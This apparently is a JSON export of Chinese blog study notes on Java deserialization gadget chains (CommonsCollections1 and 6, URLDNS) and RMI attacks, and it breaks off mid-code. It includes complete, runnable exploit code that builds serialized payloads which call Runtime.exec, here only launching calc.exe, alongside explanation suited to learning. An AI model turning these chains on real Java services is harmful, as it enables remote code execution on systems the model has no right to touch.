InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123; String.class,\n                        Class[].class &#125;, new Object[] &#123; &quot;getRuntime&quot;,\n                        new Class[0] &#125;),\n                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123; Object.class,\n                        Object[].class &#125;, new Object[] &#123; null, new Object[0] &#125;),\n                new InvokerTransformer(&quot;exec&quot;, new Class[] &#123; String.class &#125;,\n                        new String[] &#123; &quot;calc.exe&quot;&#125;),\n                new ConstantTransformer(1),\n        &#125;;\n        Transformer transformerChain &#x3D; new ChainedTransformer(fakeTransformers);\n\n        &#x2F;&#x2F; 不再使用原CommonsCollections6中的HashSet，直接使用HashMap\n        Map innerMap &#x3D; new HashMap();\n        Map outerMap &#x3D; LazyMap.decorate(innerMap, transformerChain);\n        &#x2F;&#x2F;通用链，使用TiedMapEntry\n        TiedMapEntry tme &#x3D; new TiedMapEntry(outerMap, &quot;keykey&quot;);\n\n        Map expMap &#x3D; new HashMap();\n        &#x2F;&#x2F;会触发一次利用链\n        expMap.put(tme, &quot;valuevalue&quot;);\n        &#x2F;&#x2F;移除掉以达到进入if判断，执行命令\n        outerMap.remove(&quot;keykey&quot;);\n\n        Field f &#x3D; ChainedTransformer.class.getDeclaredField(&quot;iTransformers&quot;);\n        f.setAccessible(true);\n        &#x2F;&#x2F;替换恶意transformer\n        f.set(transformerChain, transformers);\n\n        &#x2F;&#x2F; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;\n        &#x2F;&#x2F; 生成序列化字符串\n        ByteArrayOutputStream barr &#x3D; new ByteArrayOutputStream();\n        ObjectOutputStream oos &#x3D; new ObjectOutputStream(barr);\n        oos.writeObject(expMap);\n        oos.close();\n\n        &#x2F;&#x2F; 本地测试触发\n        System.out.println(barr);\n        ObjectInputStream ois &#x3D; new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));\n        Object o &#x3D; (Object)ois.readObject();\n    &#125;\n&#125;\n\n","slug":"Java反序列化3笔记","date":"2022-09-11T09:54:16.000Z","categories_index":"Java安全","tags_index":"Java","author_index":"Longw"},{"id":"40de76659604bae52b4863ba88be567d","title":"Java反序列化2笔记","content":"参考资料：p牛 Java安全漫谈 9 10 11反序列化3 4 5：\nhttps://t.zsxq.com/05MzN7miq\nhttps://t.zsxq.com/05AAAEYVN\nhttps://t.zsxq.com/05VVRfAea\n前面了解了反序列化利用基础，和URLDNS利用链\n接下来学习，Common Collections 1 利用链\nCommon Collections 1环境：eclipse，下载3.1版本的Common Collections jar文件\nhttps://nowjava.com/jar/detail/m02261225/commons-collections-3.1.jar.html\n在build path的设置中添加该jar文件，之后选用并且应用它\n同时为了在eclipse中调试方便，还需要下载Common Collections sources jar包同时导入\n在修改打开源代码路径为Common Collections sources jar  就能够查看源代码了\n根据漫谈中的简化版cc1利用链demo代码，运行后能够成功弹出计算器\n原理：利用common collection 中的transfromer构造利用链\nTransformedMap用于修饰map，被修饰的map在使用put添加新元素时会执行一个回调\nMap outerMap &#x3D; TransformedMap.decorate(innerMap, keyTransformer, valueTransformer);  \n\n对innermap进行修饰，设置一个处理新元素key的回调和一个处理\n新元素value的回调，回调指的是实现transformer接口的类，之后返回修饰好的outerMap\nTransformer是一个接口，接口里面只有一个待实现方法\npublic interface Transformer &#123;\n\n\tpublic Object transform(Object input);\n\n&#125;  \n\nTransformedMap在转换Map新元素调用tansform方法，过程类似于调用回调函数，这个函数的参数是原始对象。\nConstantTransformer是实现Transformer接口的一个类，它的过程就是在构造函数的时候传入一个对象，在tansform方法将对象在返回\n public ConstantTransformer(Object constantToReturn) &#123;\n\n\t super(); \n     iConstant &#x3D; constantToReturn; \n\n&#125; \n\npublic Object transform(Object input) &#123;\n\n \treturn iConstant; \n\n&#125;  \n\n 所以他的作⽤其实就是包装任意⼀个对象，在执行回调时返回这个对象，进而方便后续操作。  \nInvokerTransformer是一个实现Transformer接口的类，可以用来执行任意方法，是反序列化能执行任意代码的关键\n实例化时需要传入三个参数，第一个是待执行的方法名，第二个是这个函数的参数列表的参数类型，第三个是传给这个函数的参数列表\npublic InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) &#123; \n\n\tsuper();\n\n\tiMethodName &#x3D; methodName; \n\n\tiParamTypes &#x3D; paramTypes; iArgs &#x3D; args; \n\n&#125;  \n\n后面回调Transform方法，执行input对象的iMethodName方法\npublic Object transform(Object input) &#123; \n\n\tif (input &#x3D;&#x3D; null) &#123; \n\n\t\treturn null; \n\n\t&#125;\n\n \ttry &#123; \n\n\t\tClass cls &#x3D; input.getClass(); \n\n\t\tMethod method &#x3D; cls.getMethod(iMethodName, iParamTypes); \n\n\t\treturn method.invoke(input, iArgs); \n\n\t&#125; catch (NoSuchMethodException ex) &#123; \n\n\t\tthrow new FunctorException(&quot;InvokerTransformer: The method &#39;&quot; + iMethodName + &quot;&#39; on &#39;&quot; \t\t\t\t+ \tinput.getClass() + &quot;&#39; does not exist&quot;);\n\n\t &#125; catch (IllegalAccessException ex) &#123;  \n\n \t\tthrow new FunctorException(&quot;InvokerTransformer: The method &#39;&quot; + iMethodName + &quot;&#39; on &#39;&quot; \t\t\t\t+ \tinput.getClass() + &quot;&#39; cannot be accessed&quot;); \n\n\t&#125; catch (InvocationTargetException ex) &#123; \n\n\t\tthrow new FunctorException(&quot;InvokerTransformer: The method &#39;&quot; + iMethodName + &quot;&#39; on &#39;&quot; \t\t\t \t+ \tinput.getClass() + &quot;&#39; threw an exception&quot;, ex); \n\n\t&#125; \n\n&#125;  \n\n\n\nChainedTransformer是一个实现Transformer接口的类，作用是将内部的Transformer串在一起。将前面一个回调的执行结果当作后一个回调的参数传入\npublic ChainedTransformer(Transformer[] transformers) &#123; \n\n\tsuper(); \n\n\tiTransformers &#x3D; transformers; \n\n&#125; \n\npublic Object transform(Object object) &#123; \n\n\tfor (int i &#x3D; 0; i &lt; iTransformers.length; i++) &#123; \n\n\t\tobject &#x3D; iTransformers[i].transform(object); \n\n\t&#125; \n    return object;\n\n &#125;  \n\n\n\nTransformedMap使用ChainedTransformer将ConstantTransformer和InvokerTransformer串联起来，其中ConstantTransformer获取当前环境的Runtime对象，InvokerTransformer执行Runtime对象的exec方法，参数是当前计算机程序的位置\n将其作为innermap的TransformerMap修饰\nMap innerMap &#x3D; new HashMap();\n\nMap outerMap &#x3D; TransformedMap.decorate(innerMap, null,transformerChain);\n\n这个修饰无论是当作key修饰还是value修饰，还是两个修饰都是，都只会触发一次弹出一次计算器\n前面说过，当这个修饰的map添加新元素时就会触发回调\nouterMap.put(&quot;test&quot;, &quot;xxxx&quot;);\n\n所以添加一个新元素，就会执行回调，获取Runtime对象，在执行exec方法调用计算器\n完整代码：package org.vulhub.sec;\nimport org.apache.commons.collections.Transformer;\nimport org.apache.commons.collections.functors.ChainedTransformer;\nimport org.apache.commons.collections.functors.ConstantTransformer;\nimport org.apache.commons.collections.functors.InvokerTransformer;\nimport org.apache.commons.collections.map.TransformedMap;\n\nimport java.util.HashMap;\nimport java.util.Map;\n\n\npublic class CommonCollections1 &#123;\n\t public static void main(String[] args) throws Exception &#123;\n\t\t Transformer[] transformers &#x3D; new Transformer[]&#123;\n\t\t\t\t new ConstantTransformer(Runtime.getRuntime()),\n\t\t\t\t new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;,\n\t\t\t\t\t\t new Object[]\n\t\t\t\t\t\t\t\t &#123;&quot;C:\\\\Windows\\\\SysWOW64\\\\calc.exe&quot;&#125;),\n\t\t &#125;;\n\t\t Transformer transformerChain &#x3D; new\n\t\t\t\t \tChainedTransformer(transformers);\n\t\t Map innerMap &#x3D; new HashMap();\n\t\t Map outerMap &#x3D; TransformedMap.decorate(innerMap, null,transformerChain);\n\t\t outerMap.put(&quot;test&quot;, &quot;xxxx&quot;);\n\n\n\t &#125;\n\t\n&#125;\n\n\n\n\n反序列化利用环境：小于jdk 8u71\n前面的demo只能在本地运行测试，而要真正利用则需要将其生成序列化数据\ndemo的核心是利用put操作，让其执行回调，实际反序列化时需要找到一个类其readObject方法里又类似于写入的操作\nsun.reflect.annotation.AnnotationInvocationHandler这个类的readObject方法，会遍历反序列化得到的map的所有元素，并将其依次设置值，在执行这个操作时，就会触发回调\n因为该类是jdk内部的类，不能直接实例化，所以通过反射调用它\nClass clazz &#x3D; Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);\n\nConstructor construct &#x3D; clazz.getDeclaredConstructor(Class.class, Map.class);\n\nconstruct.setAccessible(true);\n\nObject obj &#x3D; construct.newInstance(Retention.class, outerMap);\n\nAnnotationInvocationHandler类的构造函数有两个参数，第一个参数是一个Annotation类；第二个是参数就是前面构造的Map。  \n在反序列化测试时发现，Runtime报错，原因是Runtime类没有实现 java.io.Serializable  接口，所以需要将其改为通过反射调用，这个得到的是一个class对象，这个java.lang.class实现了java.io.Serializable接口就能正常序列化。\nTransformer[] transformers &#x3D; new Transformer[]&#123;\t\n\n\t\t\t\tnew ConstantTransformer(Runtime.class),\n\n\t\t\t\tnew InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123; String.class,Class[].class&#125;, \t\t\t\t\t\t\t\t\t\t  new Object[] &#123;&quot;getRuntime&quot;,new Class[0] &#125;),\n\n\t\t\t\tnew InvokerTransformer(&quot;invoke&quot;, new Class[] &#123; Object.class,Object[].class &#125;, \n                                       new Object[] &#123; null, new Object[0] &#125;),\n\n\t\t\t\tnew InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;,\n\n\t\t\t\tnew String[] &#123;&quot;C:\\\\\\\\Windows\\\\\\\\SysWOW64\\\\\\\\calc.exe&quot;&#125;),\n\n&#125;;\n\n再次反序列化输出了反序列化数据，但是不能正常弹计算器\n这是由于AnnotationInvocationHandler类的readObject方法中有个if判断，只有当var7不为空时才会执行setValue操作，才能正常触发回调\n条件：\n\n sun.reflect.annotation.AnnotationInvocationHandler 构造函数的第一个参数必须是 Annotation的子类，且其中必须含有至少一个方法，假设方法名是X  \n 被 TransformedMap.decorate 修饰的Map中必须有一个键名为X的元素  \n\n所以前面使用了Retention.class，它有一个value方法，所以在innermap时，需要传入一个key为value的元素\ninner.put(&quot;value&quot;,&quot;xxx&quot;);\n\n这样就保证执行了setValue操作\n再运行就能成功弹出计算器，在小于jdk8u71的情况下。在大于等于8u71时无法弹出。\n大于8u71时无法弹出是因为修改了这个类的readObject方法，反序列化后得到的map不直接使用，而是新建一个LinkedHashMap对象，将原来的键值添加进去，后续对map的操作是基于这个LinkedHashMap对象，而这个对象并没有以前map的修饰，所以在对LinkedHashMap对象进行set和put时，也就无法触发原来map上的回调。\n完整代码：package org.vulhub.sec;\nimport org.apache.commons.collections.Transformer;\nimport org.apache.commons.collections.functors.ChainedTransformer;\nimport org.apache.commons.collections.functors.ConstantTransformer;\nimport org.apache.commons.collections.functors.InvokerTransformer;\nimport org.apache.commons.collections.map.LazyMap;\nimport org.apache.commons.collections.map.TransformedMap;\n\nimport java.io.ByteArrayInputStream;\nimport java.io.ByteArrayOutputStream;\nimport java.io.ObjectInputStream;\nimport java.io.ObjectOutputStream;\nimport java.lang.annotation.Retention;\nimport java.lang.reflect.Constructor;\nimport java.lang.reflect.InvocationHandler;\nimport java.lang.reflect.Proxy;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class CommonCollections1next &#123;\n\tpublic static void main(String[] args) throws Exception &#123;\n\t\t\n\t\tTransformer[] transformers &#x3D; new Transformer[]&#123;\t\n\t\t\t\tnew ConstantTransformer(Runtime.class),\n\t\t\t\tnew InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123; String.class,Class[].class&#125;, new Object[] &#123;&quot;getRuntime&quot;,new Class[0] &#125;),\n\t\t\t\tnew InvokerTransformer(&quot;invoke&quot;, new Class[] &#123; Object.class,Object[].class &#125;, new Object[] &#123; null, new Object[0] &#125;),\n\t\t\t\tnew InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;,\n\t\t\t\t\t\tnew String[]\n\t\t\t\t\t\t\t\t&#123;&quot;C:\\\\\\\\Windows\\\\\\\\SysWOW64\\\\\\\\calc.exe&quot;&#125;),\n\t\t&#125;;\n\t\tTransformer transformerChain &#x3D; new ChainedTransformer(transformers);\n\t\tMap innerMap &#x3D; new HashMap();\n\t\t\n\t\tinnerMap.put(&quot;value&quot;, &quot;xxxx&quot;);\n\t\tMap outerMap &#x3D; TransformedMap.decorate(innerMap, null,\n\t\t\t\ttransformerChain);\n\t\t\n\t\tClass clazz &#x3D; Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);\n\t\tConstructor construct &#x3D; clazz.getDeclaredConstructor(Class.class, Map.class);\n\t\tconstruct.setAccessible(true);\n\t\tObject obj &#x3D; construct.newInstance(Retention.class, outerMap);\n\t\t\t\t\n\t\tByteArrayOutputStream barr &#x3D; new ByteArrayOutputStream();\n\t\tObjectOutputStream oos &#x3D; new ObjectOutputStream(barr);\n\t\t\n\t\toos.writeObject(obj);\n\t\toos.close();\n\t\t\n\t\tSystem.out.println(barr);\n\t\tObjectInputStream ois &#x3D; new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));\n\t\t\n\t\tObject o &#x3D; (Object)ois.readObject();\t\t\t\n\t&#125;\n&#125;\n\n\n\nLazyMap环境：\n小于jdk8u71\n在yso中没有使用TransformedMap而是使用LazyMap，LazyMap与TransformedMap的不同点在于，LazyMap是通过get方法执行put操作，在执行get方法输入一个不存在的key值时会默认调用put方法，这样就能执行回调。\n而在AnnotationInvocationHandler类的invoke方法中正好有使用到get方法。\nyso中利用java对象代理 java.reflect.Proxy 来劫持AnnotationInvocationHandler的某个对象\nMap proxyMap &#x3D; (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] \t\t\t&#123;Map.class&#125;, handler);  \n\n第一个参数使用默认，第二个参数是需要代理的对象集合，第三个参数是实现了InvocationHandler 接口的对象，里面有代理的逻辑。\nAnnotationInvocationHandler类就是一个InvocationHandler，所以对它进行代理，在readObject方法中只要调用了任意方法就会导致执行LazyMap的get方法。\nInvocationHandler handler &#x3D; (InvocationHandler)\n\t\t\t\tconstruct.newInstance(Retention.class, outerMap);\n\n Map proxyMap &#x3D; (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] \t\n                                             &#123;Map.class&#125;, handler);  \n\n代理的对象是一个Map需要将其转化为AnnotationInvocationHandler，因为要执行的是AnnotationInvocationHandler的readObject方法。\nhandler &#x3D; (InvocationHandler) construct.newInstance(Retention.class,\n\t\t\tproxyMap);\n\n接下来就是正常的序列化和反序列化了\nyso中在transformer数组的最后还添加了一个 ConstantTransformer(1)，它的作用是隐藏程序运行爆出的进程启动信息。\n完整利用：package org.vulhub.sec;\nimport org.apache.commons.collections.Transformer;\nimport org.apache.commons.collections.functors.ChainedTransformer;\nimport org.apache.commons.collections.functors.ConstantTransformer;\nimport org.apache.commons.collections.functors.InvokerTransformer;\nimport org.apache.commons.collections.map.LazyMap;\nimport org.apache.commons.collections.map.TransformedMap;\n\nimport java.io.ByteArrayInputStream;\nimport java.io.ByteArrayOutputStream;\nimport java.io.ObjectInputStream;\nimport java.io.ObjectOutputStream;\nimport java.lang.annotation.Retention;\nimport java.lang.reflect.Constructor;\nimport java.lang.reflect.InvocationHandler;\nimport java.lang.reflect.Proxy;\nimport java.util.HashMap;\nimport java.util.Map;\npublic class CommonCollections1Lazy &#123;\n\tpublic static void main(String[] args) throws Exception &#123;\n\t\t\n\t\tTransformer[] transformers &#x3D; new Transformer[]&#123;\t\n\t\t\t\tnew ConstantTransformer(Runtime.class),\n\t\t\t\tnew InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123; String.class,Class[].class&#125;, new Object[] &#123;&quot;getRuntime&quot;,new Class[0] &#125;),\n\t\t\t\tnew InvokerTransformer(&quot;invoke&quot;, new Class[] &#123; Object.class,Object[].class &#125;, new Object[] &#123; null, new Object[0] &#125;),\n\t\t\t\tnew InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;,\n\t\t\t\t\t\tnew String[]\n\t\t\t\t\t\t\t\t&#123;&quot;C:\\\\\\\\Windows\\\\\\\\SysWOW64\\\\\\\\calc.exe&quot;&#125;),\n                new ConstantTransformer(1),\n\t\t&#125;;\n\t\tTransformer transformerChain &#x3D; new ChainedTransformer(transformers);\n\t\tMap innerMap &#x3D; new HashMap();\n\t\t\n\t\tMap outerMap &#x3D; LazyMap.decorate(innerMap, transformerChain);\n\t\t\n\t\tClass clazz &#x3D; Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);\n\t\tConstructor construct &#x3D; clazz.getDeclaredConstructor(Class.class, Map.class);\n\t\tconstruct.setAccessible(true);\n\t\t\n\t\tInvocationHandler handler &#x3D; (InvocationHandler)\n\t\t\t\tconstruct.newInstance(Retention.class, outerMap);\n\t\t&#x2F;&#x2F;进行proxy\n\t\tMap proxyMap &#x3D; (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new\n\t\t\t\tClass[] &#123;Map.class&#125;, handler);\n\t\t&#x2F;&#x2F;用AnnotationInvocationHandler对这个proxyMap进行包裹\n\t\thandler &#x3D; (InvocationHandler) construct.newInstance(Retention.class,\n\t\t\t\tproxyMap);\n\n\t\t\t\t\n\t\tByteArrayOutputStream barr &#x3D; new ByteArrayOutputStream();\n\t\tObjectOutputStream oos &#x3D; new ObjectOutputStream(barr);\n\t\t\n\t\toos.writeObject(handler);\n\t\toos.close();\n\t\t\n\t\tSystem.out.println(barr);\n\t\tObjectInputStream ois &#x3D; new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));\n\t\t\n\t\tObject o &#x3D; (Object)ois.readObject();\n\t\t\n\t\t\n\t&#125;\n&#125;\n\n\n\n","slug":"Java反序列化2笔记","date":"2022-09-05T11:58:43.000Z","categories_index":"Java安全","tags_index":"Java","author_index":"Longw"},{"id":"ef40a0cd7170df96b7fe2fe93ccaa11e","title":"Java反序列化1笔记","content":"参考资料：p牛 Java安全漫谈7 8  反序列化1 2\nhttps://t.zsxq.com/05QrVnMBy\nhttps://t.zsxq.com/053zvFeAu\nJava反序列化利用基础在Java 中，主要是通过\nwriteobject写入序列化数据到stream\n并将\n序列化输入的数据保存到 Annotation  中\n通过\nreadobject读取写入到stream的序列化数据将其反序列化执行\nURLDNS反序列化利用链（gadget） ysoserial的URLDNS类，通过getobject方法获取payload，getobject方法将会返回被序列化的对象，这个对象在这条链里是hashmap\n通过hashmap类的readobject方法触发反序列化\n在hashmap的readobject方法中会执行hash方法\nputVal(*hash*(key), key, value, false, false);\n\n这个hash方法直接使用的在hashmap中\nreturn (key &#x3D;&#x3D; null) ? 0 : (h &#x3D; key.hashCode()) ^ (h &gt;&gt;&gt; 16);\n\nhash方法又调用了hashcode方法，这次调用是通过key调用的\n这个key是yso实例化的一个url对象，所以查看url中的hashcode方法\nif (hashCode !&#x3D; -1)\n    return hashCode;\n\nhashCode &#x3D; handler.hashCode(this);\nreturn hashCode;\n\n序列化时设置了\nReflections.*setFieldValue*(u, &quot;hashCode&quot;, -1); &#x2F;&#x2F; During the put above, the URL&#39;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.\n\n这个url对象的hashcode初始值为-1，就会调用handler的hashcode方法\n这个handler是URLStreamHandler对象的某个子类对象  （这个不知道代码在哪里写了）可能是这个\nstatic Hashtable&lt;String,URLStreamHandler&gt; *handlers* &#x3D; new Hashtable&lt;&gt;();\n\nURLStreamHandler是抽象类，所以只能实例化继承的子类\n在hashtable中没有重载或是覆写那么调用的这个方法就是在URLStreamHandler这个类中存在的该方法\nInetAddress addr &#x3D; getHostAddress(u);\n\n调用了getHostAddress方法，这个方法\nreturn u.getHostAddress();\n\n又调用了u也就是key的getHostAddress方法，在url类中\nhostAddress &#x3D; InetAddress.*getByName*(host);\n\n这个getHostAddress方法又调用InetAddress的getByName方法\n这个getByName方法的实现，是调用了getByAllName方法，作用是根据主机名，获取其IP地址，也就是发出一次DNS请求\n在yso中为了防止发出生成payload的时候也发出url请求和DNS查询，就重写了URLStreamHandler中的SilentURLStreamHandler类。\n整个流程：URLDNS—-&gt;HashMap.readobject()\nHashMap.readobject()—-&gt;HashMap.hash()\nHashMap.hash()—-&gt;URL.hashcode()\nURL.hashcode()—-&gt;URLStreamHandler.hashcode()\nURLStreamHandler.hashcode()—-&gt;URLStreamHandler.getHostAddress()\nURLStreamHandler.getHostAddress()—-&gt;URL.getHostAddress()\nURL.getHostAddress()—-&gt;InetAddress.getByName()\n上面的URLStreamHandler.getHostAddress()是一个重载方法，可以和URL.getHostAddress()一起当作是一个函数的调用\n星球问题解答：会上树的猪：\np师傅，关于这个链有一个小问题想请教。就是在对URL进行反序列化的时候不会调用构造方法了，那反序列化之后的handler属性是在哪一步被赋值的，我debug了一下URL类的readObject方法，只看到有一个调用了getURLStreamHandler()方法，是和handler属性有关的。就是这个handler的生成不是很明白，望师傅答疑\ncc：\n最近也在学Java反序列化，这个问题在分析的时候也困扰着我。后面经过分析发现。在URL类中还有一个方法是readResolve。在readResolve方法中会调用fabricateNewURL方法中new URL实例返回。在new URL(urlString);中会对handler进行赋值：this.handler = handler。并且在反序列化的时候会自动调用readResolve方法。注：可下断点在invokeReadResolve方法上，内部通过反射调用了readResolve。 readResolve作用，其方法的返回值为一个Object对象，该方法返回的对象将会代替反序列化的结果，直接将其作为反序列化的结果返回给上层调用ObjectInputStream对象readObject方法的结果。 分析过后感觉这个readResolve也是一个可利用的点，与readObject一样会自动调用。应该也可以通过readResolve作为入口的链。不过目前没有看到有链利用到了这一个，所以也不知道自己分析的对不对，求大家解答。\n","slug":"Java反序列化1笔记","date":"2022-09-05T11:53:13.000Z","categories_index":"Java安全","tags_index":"Java","author_index":"Longw"},{"id":"fb61931117f747252b543f33903e3e6d","title":"Java RMI笔记","content":"参考资料：廖雪峰老师 Java教程 RMI\nhttps://www.liaoxuefeng.com/wiki/1252599548343744/1323711850348577\np牛  Java安全漫谈456 RMI \nhttps://t.zsxq.com/052Nj62Jq\nhttps://t.zsxq.com/057qNvJ6I\nhttps://t.zsxq.com/05j2fM7iE\nseebug文章\nhttps://paper.seebug.org/1091/\nJava各种协议分析\nhttps://i.blackhat.com/eu-19/Wednesday/eu-19-An-Far-Sides-Of-Java-Remote-Protocols.pdf\n原理：客户端远程调用服务端代码，在服务端执行改代码，并返回结果给客户端\n整个过程由RMI底层负责实现序列化和反序列化\n要实现RMI，服务器和客户端必须共享同一个接口。\nJava的RMI规定此接口必须派生自java.rmi.Remote，并在每个方法声明抛出RemoteException。\nJava的RMI严重依赖序列化和反序列化，而这种情况下可能会造成严重的安全漏洞，因为Java的序列化和反序列化不但涉及到数据，还涉及到二进制的字节码，即使使用白名单机制也很难保证100%排除恶意构造的字节码。因此，使用RMI时，双方必须是内网互相信任的机器，不要把1099端口暴露在公网上作为对外服务。\n此外，Java的RMI调用机制决定了双方必须是Java程序，其他语言很难调用Java的RMI。如果要使用不同语言进行RPC调用，可以选择更通用的协议，例如gRPC。\nRMI Registry    提供注册，并将其绑定到RMI Server的对象上\nRMI Server    提供远程服务，里面有各种方法，有返回结果\nRMI Client     连接Registry，之后调用Server上的方法，获取返回结果\n简单RMI：服务端：package com.rmitest;\n\nimport java.rmi.Naming;\nimport java.rmi.Remote;\nimport java.rmi.RemoteException;\nimport java.rmi.registry.LocateRegistry;\nimport java.rmi.registry.Registry;\nimport java.rmi.server.UnicastRemoteObject;\n\n&#x2F;&#x2F;RMI服务创建后，将在后台开启监听线程，代码中并没有停止线程，\n&#x2F;&#x2F;所以需要使用资源管理器，搜索线程pid去停止该线程\npublic class RMIServer &#123;\n\t&#x2F;&#x2F;RMIServer端分为三个部分\n\t&#x2F;&#x2F;⼀个继承了 java.rmi.Remote 的接⼝，其中定义我们要远程调⽤的函数，⽐如这⾥的 hello()\n\tpublic interface IRemoteHelloWorld extends Remote &#123;\n\t\t public String hello() throws RemoteException;\n\t&#125;\n\t\t&#x2F;&#x2F;⼀个实现了此接⼝的类\n\tpublic class RemoteHelloWorld extends UnicastRemoteObject implements\n\t\tIRemoteHelloWorld &#123;\n\t\t protected RemoteHelloWorld() throws RemoteException &#123;\n\t\t\t super();\n\t\t \t&#125;\n\t\t \n\t\t public String hello() throws RemoteException &#123;\n\t\t\t System.out.println(&quot;call from&quot;);\n\t\t\t return &quot;Hello world&quot;;\n\t\t \t&#125;\n\t&#125;\n\t\t \n\tprivate void start() throws Exception &#123;\n\t\t&#x2F;&#x2F;用来创建Registry，\n\t\t&#x2F;&#x2F;并将上面的类实例化后绑定到⼀个地址。\n\t\t &#x2F;&#x2F;这就是我们所谓的Server了。s\n\t\tRemoteHelloWorld h &#x3D; new RemoteHelloWorld();\n\t\tLocateRegistry.createRegistry(1099);\n\t\tNaming.rebind(&quot;rmi:&#x2F;&#x2F;127.0.0.1:1099&#x2F;Hello&quot;, h);\n\t&#125;\n\t\n\t&#x2F;&#x2F;实例化RMIServer类，并执行start方法\n\tpublic static void main(String[] args) throws Exception &#123;\n\t\t\t new RMIServer().start();\n\t&#125;\n\t\n&#125;\n\n客户端：package com.rmitest;\n\nimport com.rmitest.RMIServer;\nimport java.rmi.Naming;\nimport java.rmi.NotBoundException;\nimport java.rmi.RemoteException;\n\npublic class RMIClient &#123;\n\n\tpublic static void main(String[] args) throws Exception &#123;\n\t\t RMIServer.IRemoteHelloWorld hello &#x3D; \n\t\t\t\t (RMIServer.IRemoteHelloWorld)Naming.lookup(&quot;rmi:&#x2F;&#x2F;192.168.0.107:1099&#x2F;Hello&quot;);\n\t\t String ret &#x3D; hello.hello();\n\t\t System.out.println(ret);\n\t&#125;\n\n\n&#125;\n\n\n\n利用： 1. 如果我们能访问RMI Registry服务，如何对其攻击？\n 2. 如果我们控制了目标RMI客户端中 Naming.lookup 的第一个参数（也就是RMI Registry的地 址），能不能进行攻击？  \n首先测试RMI Registry 的远程调用，发现RMI Registry  只允许本地调用rebind、bind、unbind方法，远程调用允许list、lookup方法\nlist方法能获取服务端所有绑定的对象列表\nlookup则是能获取服务端某个对象\nlookup让我们能够调用服务端上存在的危险方法\nhttps://github.com/NickstaDB/BaRMIe  该项目可以测试RMI上存在的危险方法\nApplet codebase任意代码执行要求：\n 安装并配置了SecurityManager  \nJava版本低于7u21、6u45，或者设置了 java.rmi.server.useCodebaseOnly=false  ，这个之前版本默认java.rmi.server.useCodebaseOnly=false  \n\n复现：按照安全漫谈5，写好3个服务类，之后运行服务端\nRemoteRMIServerpackage com.rmitest.CodeBase;\n\nimport java.rmi.Naming;\nimport java.rmi.Remote;\nimport java.rmi.RemoteException;\nimport java.rmi.registry.LocateRegistry;\nimport java.rmi.server.UnicastRemoteObject;\nimport java.util.List;\n\npublic class RemoteRMIServer &#123;\n\tprivate void start() throws Exception &#123;\n\t\tif (System.getSecurityManager() &#x3D;&#x3D; null) &#123;\n\t\t\tSystem.out.println(&quot;setup SecurityManager&quot;);\n\t\t\tSystem.setSecurityManager(new SecurityManager());\n\t\t&#125;\n\t\tCalc h &#x3D; new Calc();\n\t\tLocateRegistry.createRegistry(1099);\n\t\tNaming.rebind(&quot;refObj&quot;, h);\n\t&#125;\n\tpublic static void main(String[] args) throws Exception &#123;\n\tnew RemoteRMIServer().start();\n\t&#125;\n&#125;\n\n\n\nICalcpackage com.rmitest.CodeBase;\n\nimport java.rmi.Remote;\n\nimport java.rmi.RemoteException;\nimport java.util.List;\npublic interface ICalc extends Remote &#123;\n\tpublic Integer sum(List&lt;Integer&gt; params) throws RemoteException;\n&#125;\n\n\nCalcpackage com.rmitest.CodeBase;\n\nimport java.rmi.Remote;\nimport java.rmi.RemoteException;\nimport java.util.List;\nimport java.rmi.server.UnicastRemoteObject;\n\npublic class Calc extends UnicastRemoteObject implements ICalc &#123;\n\tpublic Calc() throws RemoteException &#123;&#125;\n\tpublic Integer sum(List&lt;Integer&gt; params) throws RemoteException &#123;\n\t\tInteger sum &#x3D; 0;\n\t\tfor (Integer param : params) &#123;\n\t\t\tsum +&#x3D; param;\n\t\t&#125;\n\t\treturn sum;\n\t&#125;\n&#125;\n\n\n同时该文件夹需要有client.policy文件\ngrant &#123;\n\tpermission java.security.AllPermission;\n&#125;;\n\njavac *.java\n带着包名编译，在java文件目录无法执行程序，需要切换到src目录执行命令\n同时需要将Client.policy放到src目录下\njava -Djava.rmi.server.hostname=192.168.0.107 -Djava.rmi.server.useCodebaseOnly=false -Djava.security.policy=client.policy com.rmitest.CodeBase.RemoteRMIServer\n这时执行程序需要用完整程序名\n在另一个文件夹编写好client类，编译运行\nRMIClientpackage com.rmitest.CodeBaseClient;\n\nimport java.rmi.Naming;\nimport java.rmi.Remote;\nimport java.rmi.RemoteException;\nimport java.util.List;\n\nimport com.rmitest.CodeBase.ICalc;\n\nimport java.util.ArrayList;\nimport java.io.Serializable;\n\npublic class RMIClient implements Serializable &#123;\t\n\t\n\tpublic class Payload extends ArrayList&lt;Integer&gt; &#123;&#125;\n\tpublic void lookup() throws Exception &#123;\n\t\t&#x2F;&#x2F;需要设置，不然报错\n\t\tif (System.getSecurityManager() &#x3D;&#x3D; null) &#123;\n\t\t\t\tSystem.out.println(&quot;setup SecurityManager&quot;);\n\t\t\t\tSystem.setSecurityManager(new SecurityManager());\n\t\t&#125;\n\t\tICalc r &#x3D; (ICalc)\n\t\t\t\tNaming.lookup(&quot;rmi:&#x2F;&#x2F;192.168.0.107:1099&#x2F;refObj&quot;);\n\t\tList&lt;Integer&gt; li &#x3D; new 